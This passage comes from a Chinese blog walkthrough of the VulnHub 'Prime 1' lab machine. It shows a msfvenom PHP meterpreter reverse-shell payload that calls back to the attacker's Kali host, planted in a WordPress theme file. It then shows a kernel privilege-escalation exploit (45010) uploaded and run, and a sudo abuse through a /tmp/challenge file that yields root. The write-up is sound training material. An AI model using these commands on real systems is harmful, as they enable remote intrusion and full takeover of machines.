+<p><img src="/img/image-20221104111549931.png" alt="image-20221104111549931"></p>
+<p>然后我又去浏览器访问这个网址</p>
+<p><img src="/img/image-20221104111657882.png" alt="image-20221104111657882"></p>
+<p>返回404，意思就是secret.php不在这个路径</p>
+<p>到这里，思路又断了（真的太菜了）</p>
+<p>继续偷思路（emm这叫借鉴！！）</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>了解到可以<strong>反弹shell</strong>，其实之前一直知道这个概念，但是没有实战过，所以也不知道什么时候该用，怎么用。这次真的是学到了！</p>
+<p>继续用我浅显的理解来解释一下<strong>反弹shell</strong></p>
+<blockquote>
+<p>首先要明确：<strong>反弹shell</strong>和<strong>一句话木马</strong>的目的都是一样的，就是<strong>为了拿shell</strong></p>
+<p>区别在于</p>
+<ul>
+<li>一句话木马：上传之后，你得主动用WebShell管理工具之类的东西去连他，连上了才可以</li>
+<li>反弹shell：让<strong>它主动来连你</strong></li>
+</ul>
+<p>这有啥不一样呢？为啥一定要它来连你呢？你连他为啥又不行呢？</p>
+<p>想象一下，你去别的学校找朋友玩泥巴，但是他们学校只允许本校师生进出，不允许外面的人进出。这时候，你们想见面一起玩泥巴，那就只能让他出来找你，因为门卫不让你进去找他啊！！（说翻墙钻狗洞进去的小伙子，你真是个大聪明🤡）</p>
+<p>一样的意思，当一台机子处于<strong>内网、动态IP</strong>，或者<strong>配置了防火墙、杀毒软件</strong>，那很可能，你是没有办法去连接它的，只能让它出来连你，这就是<strong>反弹shell</strong></p>
+</blockquote>
+<h3 id="生成php反弹shell代码"><a href="#生成php反弹shell代码" class="headerlink" title="生成php反弹shell代码"></a>生成php反弹shell代码</h3><p>现在，用我们的<em><strong>美少妇（MSF）</strong></em>来生成php反弹shell的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.120.128 lport=6666 -o shell.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这句话的意思是让msfvenom的php&#x2F;meterpreter&#x2F;reverse_tcp模块来生成反弹shell的脚本，设置让靶机来连Kali（IP:192.168.120.128）的6666端口，保存为<code>shell.php</code></p>
+</blockquote>
+<p><img src="/img/image-20221104133526200.png" alt="image-20221104133526200"></p>
+<h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>把生成的代码粘贴到<code>secret.php</code>里面（粘贴我上面黑色的那一坨，前面俩不要粘上去了），保存</p>
+<p><img src="/img/image-20221104134106090.png" alt="image-20221104134106090"></p>
+<h3 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h3><p>接下来，就是监听了</p>
+<blockquote>
+<p>为啥要监听？</p>
+<p>接着上面的例子说哈，你朋友都出校门来找你玩泥巴来了，你不得蹲在门口等他吗？不然你怎么知道他出来了呢？只能蹲在门口守着呗。</p>
+<p>这也是一样的，你让靶机来连你，你不监听那个端口，你咋知道它来连你那个端口了？</p>
+</blockquote>
+<p>那我们用啥来监听呢？<del>当然是亲自蹲在电脑显示器上呗</del>（bushi）</p>
+<p>当然是用工具来监听啦~可用的工具有很多，这里推荐<code>nc</code>和<code>msfconsole</code></p>
+<p>这里用msfconsole（因为它给我比心❤）</p>
+<ol>
+<li>命令行输入<code>msfconsole</code>，启动美少妇</li>
+</ol>
+<p><img src="/img/image-20221104134918991.png" alt="image-20221104134918991"></p>
+<ol start="2">
+<li>使用监听模块</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20221104135312786.png" alt="image-20221104135312786"></p>
+<ol start="3">
+<li>告诉它，你在等待一个php的反弹来连你</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里的模块和上面使用msfvenom生成反弹shell的模块是一样的</span></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>指定监听的IP和端口</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.120.128</span><br><span class="line">set lport 6666</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>启动监听</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">任选一个执行，效果是一样的</span></span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h3 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h3><p>监听就准备好啦~接下来的问题是</p>
+<p><strong>靶机什么时候来连我们呢？</strong></p>
+<p>这就得你去提醒一下它，让他来连你，这时候我突然发现，我上面费大劲找的<code>secret.php</code>路径，这时候用得到了！！！</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php</a></p>
+<p><img src="/img/image-20221104140546616.png" alt="image-20221104140546616"></p>
+<p>页面虽然一直在加载，这时候打开我们的Kali看看，已经进入到meterpreter了！！！就是已经反弹连接上了，我们已经拿到靶机的shell了。</p>
+<p>执行命令看看，没问题！</p>
+<p><img src="/img/image-20221104155213895.png" alt="image-20221104155213895"></p>
+<blockquote>
+<p>注意：</p>
+<p>我们此时拿到的shell环境，并不是root用户，meterpreter并不能执行所有的命令</p>
+</blockquote>
+<h1 id="内核提权【适用于Ubuntu-4-10】"><a href="#内核提权【适用于Ubuntu-4-10】" class="headerlink" title="内核提权【适用于Ubuntu 4.10】"></a>内核提权【适用于Ubuntu 4.10】</h1><p>上面我们拿到了靶机的Linux版本，用msfconsole看看有没有能提权的模块</p>
+<blockquote>
+<p>&#x3D;&#x3D;注意&#x3D;&#x3D;：<em>不要在meterpreter下直接执行，新开一个Terminal，进入msfconsole里面执行</em></p>
+<p>或者使用<code>background</code>回退到msf的界面，记住返回的<code>session</code>为1，到时候直接通过<code>sessions 1</code>回到meterpreter</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 16.04 Ubuntu</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20221104171340983.png" alt="image-20221104171340983"></p>
+<p>使用其中符合条件的<em><strong>linux&#x2F;local&#x2F;45010.c</strong></em></p>
+<blockquote>
+<p>用来提权到root，用C语言编写其路径为&#x2F;usr&#x2F;share&#x2F;exploits&#x2F;local&#x2F;45010.c</p>
+</blockquote>
+<ol>
+<li>将该文件拷贝到当前目录</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/45010.c ./</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>用<code>gcc</code>编译该文件</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>用meterpreter</strong>把上面生成的<code>45010</code>移动到靶机里面（<strong>此步骤在meterpreter里面执行！！！</strong>）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/slipper/45010 /tmp</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>本句的意思是：把本机<code>home/slipper/45010</code>上传到靶机的<code>/tmp</code>目录</p>
+</blockquote>
+<ol start="4">
+<li>进入shell，给<code>45010</code>添加可执行的权限</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3108 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时已经进入到靶机的shell环境</span></span><br><span class="line">pwd	# 查看当前目录</span><br><span class="line">/tmp</span><br><span class="line">chmod +x 45010	# 添加执行权限</span><br><span class="line">./45010		# 执行该提权程序</span><br></pre></td></tr></table></figure>
+
+<p>这时候已经提权成功了</p>
+<h1 id="提权失败"><a href="#提权失败" class="headerlink" title="提权失败"></a>提权失败</h1><p>&#x3D;&#x3D;实际上，我的提权失败了&#x3D;&#x3D;</p>
+<p>按理来说，是可以成功的，但是我当时没弄完就去做其他的事情，第二天再来弄的时候，我的靶机IP变了，从145变成147了。我当时觉得奇怪，因为我虚拟机Kali的IP一直就没变过，为什么这个突然变了。当时没有在意，直到我使用上述方法，屡次提权失败</p>
+<p>于是，我几乎翻遍了网上关于Prime1这个靶机的记录，终于看到一句话：</p>
+<p>&#x3D;&#x3D;有些情况我们下载的靶机的版本并不是Ubuntu4.10而是Ubuntu 4.15，就不能通过45010这个复现成功&#x3D;&#x3D;</p>
+<p>但是我明明记得我是4.10。然后，我就又去看了一下我Ubuntu靶机的版本信息</p>
+<p><img src="/img/image-20221105150754154.png" alt="image-20221105150754154"></p>
+<p>&#x3D;&#x3D;我的Ubuntu居然自动升级了！&#x3D;&#x3D;</p>
+<p>可以往上看我当时的截图，当时的版本是4.10的，一觉起来，Ubuntu靶机给我自动升级成4.15了，估计也是这个原因，导致靶机的IP发生了变化。</p>
+<p>而此时，4.15版本的已经不能使用上述方法提权了。我用msf搜索了升级之后的版本还有没有可以用的提权代码，已经🈚了，所以靠nday提权已经行不通了，靶机的设计者的目的并不是想让我们靠提权来拿到Flag，而是像上面一样，一层层的剥开，找到密码。</p>
+<blockquote>
+<p>这个问题真的折磨了我很久，第一次遇到这种骚操作</p>
+</blockquote>
+<h1 id="提权【适用于Ubuntu-4-15】"><a href="#提权【适用于Ubuntu-4-15】" class="headerlink" title="提权【适用于Ubuntu 4.15】"></a><strong>提权【适用于Ubuntu 4.15】</strong></h1><ol>
+<li>进入shell环境</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><a target="_blank" rel="noopener" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method1pythonptymodule">将shell升级到完全交互式的TTY</a></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>查看当前用户可以用 sudo 执行哪些命令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20221105153916471.png" alt="image-20221105153916471"></p>
+<p>这里的<code>/home/saket/enc</code>引起了注意，它是一个可执行文件，执行需要输入密码，使用<code>follow_the_ippsec</code>发现不对</p>
+<h2 id="backup文件"><a href="#backup文件" class="headerlink" title="backup文件"></a>backup文件</h2><p>在<code>/opt</code>目录下发现<code>backup</code>文件夹，最终发现了<code>可执行文件enc</code>的密码为<code>backup_password</code></p>
+<p><img src="/img/image-20221105154613484.png" alt="image-20221105154613484"></p>
+<ol start="4">
+<li>执行<code>enc</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/saket</span><br><span class="line">./enc</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>此时发现<code>/home/saket</code>目录下多了两个文件：<code>enc.txt</code>和<code>key.txt</code></li>
+</ol>
+<p><img src="/img/image-20221105155104206.png" alt="image-20221105155104206"></p>
+<p>得到了一串字符和一条提示，看样子应该是base64编码的</p>
+<ol start="6">
+<li>使用<a target="_blank" rel="noopener" href="https://www.cmd5.com/">cmd5</a>加密<code>ippsec</code></li>
+</ol>
+<p><img src="/img/image-20221105155927773.png" alt="image-20221105155927773"></p>
+<p>得到</p>
+<p>md5(ippsec,32) &#x3D; 366a74cb3c959de17d61db30591c39d1<br>md5(ippsec,16) &#x3D; 3c959de17d61db30</p>
+<ol start="7">
+<li>使用<a target="_blank" rel="noopener" href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES Encryption and Decryption Online Tool</a>解密<code>enc.txt</code></li>
+</ol>
+<p><img src="/img/image-20221105161448956.png" alt="image-20221105161448956"></p>
+<p>解密结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RG9udCB3b3JyeSBzYWtldCBvbmUgZGF5IHdlIHdpbGwgcmVhY2ggdG8Kb3VyIGRlc3RpbmF0aW9uIHZlcnkgc29vbi4gQW5kIGlmIHlvdSBmb3JnZXQgCnlvdXIgdXNlcm5hbWUgdGhlbiB1c2UgeW91ciBvbGQgcGFzc3dvcmQKPT0+ICJ0cmlidXRlX3RvX2lwcHNlYyIKClZpY3Rvciw=</span><br></pre></td></tr></table></figure>
+
+<ol start="8">
+<li>对上面的字符串进行<a target="_blank" rel="noopener" href="https://tool.chinaz.com/tools/base64.aspx">Base64解码</a></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And if you forget </span><br><span class="line">your username then use your old password</span><br><span class="line">==&gt; &quot;tribute_to_ippsec&quot;</span><br><span class="line"></span><br><span class="line">Victor,</span><br></pre></td></tr></table></figure>
+
+<p>得到了密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tribute_to_ippsec</span><br></pre></td></tr></table></figure>
+
+<h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su saket</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20221105162115763.png" alt="image-20221105162115763"></p>
+<ul>
+<li>查看saket用户可用sudo执行的命令</li>
+</ul>
+<p><img src="/img/image-20221105165526516.png" alt="image-20221105165526516"></p>
+<ul>
+<li>跟进到&#x2F;home&#x2F;victor&#x2F;undefeated_victor</li>
+</ul>
+<p><img src="/img/image-20221105165644625.png" alt="image-20221105165644625"></p>
+<p>提示<code>/tmp/challenge</code> not found</p>
+<h2 id="x2F-bin-x2F-bash提权"><a href="#x2F-bin-x2F-bash提权" class="headerlink" title="&#x2F;bin&#x2F;bash提权"></a>&#x2F;bin&#x2F;bash提权</h2><ul>
+<li>接下来的思路就是创建<code>challenge</code>文件，将<code>/bin/bash</code>写入文件中，然后重新执行<code>sudo /home/victor/undefeated_victor</code>命令以<strong>获取root权限的shell</strong>.</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; challenge</span><br><span class="line">chmod +x challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20221105170834360.png" alt="image-20221105170834360"></p>
+<p>可以看到，此时已经&#x3D;&#x3D;成功拿到root权限&#x3D;&#x3D;</p>
+<h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><ul>
+<li>切换到&#x2F;root,查看</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20221105171431456.png" alt="image-20221105171431456"></p>
+<ul>
+<li>查看<code>root.txt</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20221105171456711.png" alt="image-20221105171456711"></p>
+<p>完结撒花~~~终于拿到了flag</p>
+<h1 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h1><h2 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h2><ul>
+<li><p>使用nmap扫描的时候，用的是最简单的命令，扫描显示出来的信息比较单一</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTVC ... &gt; xxx.txt</span><br></pre></td></tr></table></figure>
+
+<p>导出到文件里，到时候找起来更方便，不要每次都在终端翻来翻去</p>
+</li>
+<li><p>对Kali内的工具不熟悉，到某个特定的步骤之后，知道要干啥，但不知道具体要怎么做，有什么工具可以使用。如果只下载了，又不去用它，那为什么要下载呢？单纯为了好看吗？</p>
+<blockquote>
+<p>后续花时间专门整理一下Kali的工具，输出一个文档</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul>
+<li>初次解除了完整的一套渗透测试流程，从查找IP到拿到Root权限，从Web打到shell再到提权</li>
+<li>wordpress的主题模块可以执行命令</li>
+<li>反弹shell初体验</li>
+<li>更加熟悉linux的一些命令，比如<code>sudo -l</code>等</li>
+<li>msf可用用background命令把meterpreter退到后台</li>
+</ul>
+<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><ul>
+<li>最后AES解密：为什么是AES？那些参数是这么选的，问了大佬，说是密码学的知识！补！！！</li>
+<li>写入<code>/bin/bash</code>提权，不懂！看！！！</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jenchoi.top">jenchoi413</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jenchoi.top/2022/prime-1-walkthrough/">https://jenchoi.top/2022/prime-1-walkthrough/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jenchoi.top" target="_blank">jenchoi413的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/vulnhub%E7%B3%BB%E5%88%97/">vulnhub系列</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/cdn-introduction-and-bypass/"><img class="prev-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CDN介绍及绕过</div></div></a></div><div class="next-post pull-right"><a href="/2022/burpsuite-captcha-killer-and-ddddocr/"><img class="next-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Burp验证码爆破captcha-killer+ddddocr</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/dc-1-walkthrough/" title="【vulnhub】DC-1攻略"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-10</div><div class="title">【vulnhub】DC-1攻略</div></div></a></div><div><a href="/2022/my-cmsms-walkthrough/" title="【vulnhub】My cmsms攻略"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-05</div><div class="title">【vulnhub】My cmsms攻略</div></div></a></div><div><a href="/2022/bossplayer-ctf-walkthrough/" title="【vulnhub】bossplayerCTF攻略"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-29</div><div class="title">【vulnhub】bossplayerCTF攻略</div></div></a></div><div><a href="/2022/dc-2-walkthrough/" title="【vulnhub】DC-2攻略"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-13</div><div class="title">【vulnhub】DC-2攻略</div></div></a></div><div><a href="/2022/jangow-1.0.1-walkthrough/" title="【vulnhub】jangow1.0.1攻略"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-24</div><div class="title">【vulnhub】jangow1.0.1攻略</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B5%84%E6%BA%90"><span class="toc-number">1.</span> <span class="toc-text">资源</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%BE%E9%9D%B6%E6%9C%BAIP"><span class="toc-number">2.</span> <span class="toc-text">找靶机IP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Guest%E7%A1%AE%E5%AE%9AIP"><span class="toc-number">2.1.</span> <span class="toc-text">通过Guest确定IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%89%AB%E6%8F%8F%E7%A1%AE%E5%AE%9AIP"><span class="toc-number">2.2.</span> <span class="toc-text">通过扫描确定IP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.</span> <span class="toc-text">端口服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.</span> <span class="toc-text">Web服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">4.1.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fuzz%E5%8F%82%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">Fuzz参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0index-php%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">4.3.</span> <span class="toc-text">得到index.php的参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0iamge-php%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">4.4.</span> <span class="toc-text">得到iamge.php的参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#password-txt"><span class="toc-number">4.5.</span> <span class="toc-text">password.txt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E5%BD%95WordPress"><span class="toc-number">4.6.</span> <span class="toc-text">登录WordPress</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WordPress%E4%B8%BB%E9%A2%98%E7%BC%96%E8%BE%91"><span class="toc-number">4.7.</span> <span class="toc-text">WordPress主题编辑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#getshell"><span class="toc-number">5.</span> <span class="toc-text">getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">5.1.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E8%B7%AF%E5%BE%84"><span class="toc-number">5.2.</span> <span class="toc-text">确定路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.3.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90php%E5%8F%8D%E5%BC%B9shell%E4%BB%A3%E7%A0%81"><span class="toc-number">5.3.1.</span> <span class="toc-text">生成php反弹shell代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.3.2.</span> <span class="toc-text">上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.3.3.</span> <span class="toc-text">监听端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0shell"><span class="toc-number">5.3.4.</span> <span class="toc-text">拿到shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E3%80%90%E9%80%82%E7%94%A8%E4%BA%8EUbuntu-4-10%E3%80%91"><span class="toc-number">6.</span> <span class="toc-text">内核提权【适用于Ubuntu 4.10】</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%A4%B1%E8%B4%A5"><span class="toc-number">7.</span> <span class="toc-text">提权失败</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E3%80%90%E9%80%82%E7%94%A8%E4%BA%8EUbuntu-4-15%E3%80%91"><span class="toc-number">8.</span> <span class="toc-text">提权【适用于Ubuntu 4.15】</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#backup%E6%96%87%E4%BB%B6"><span class="toc-number">8.1.</span> <span class="toc-text">backup文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7"><span class="toc-number">8.2.</span> <span class="toc-text">切换用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x2F-bin-x2F-bash%E6%8F%90%E6%9D%83"><span class="toc-number">8.3.</span> <span class="toc-text">&#x2F;bin&#x2F;bash提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%BFflag"><span class="toc-number">9.</span> <span class="toc-text">拿flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">个人总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E8%B6%B3"><span class="toc-number">10.1.</span> <span class="toc-text">不足</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E8%8E%B7"><span class="toc-number">10.2.</span> <span class="toc-text">收获</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%96%91%E6%83%91"><span class="toc-number">10.3.</span> <span class="toc-text">疑惑</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By jenchoi413</div><div class="footer_custom_text">来自地狱-去往天堂-路过人间</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button 